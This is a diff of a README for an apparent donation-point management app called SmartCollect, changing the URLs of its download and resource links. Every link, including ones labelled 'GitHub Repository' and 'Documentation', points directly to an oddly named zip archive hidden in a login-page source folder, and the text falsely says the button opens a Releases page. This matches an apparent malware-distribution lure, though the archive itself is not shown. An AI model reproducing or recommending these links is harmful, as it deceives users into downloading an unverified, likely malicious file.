@@ -21,7 +21,7 @@ SmartCollect is a user-friendly platform for managing voluntary donation points 
 Follow these simple steps to download and set up SmartCollect on your computer.
 
 ## 📥 Download & Install
-[Download SmartCollect](https://github.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/raw/refs/heads/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
+[Download SmartCollect](https://raw.githubusercontent.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
 
 1. Click the **Download SmartCollect** button above.
 2. You will be directed to the Releases page.
@@ -62,8 +62,8 @@ If you encounter any issues, follow these steps:
 For persistent issues, you can reach out to the community by opening an issue on the GitHub repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/raw/refs/heads/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
-- [Documentation](https://github.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/raw/refs/heads/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/lucass-reis/smart-collect-gestao-de-pontos-de-entrega-voluntaria-para-ongs/main/web/src/pages/login/smart-gestao-voluntaria-collect-entrega-para-de-pontos-ongs-v2.4.zip)
 
 ## 📩 Contact
 For further questions, please contact the collaborators via their GitHub profiles.
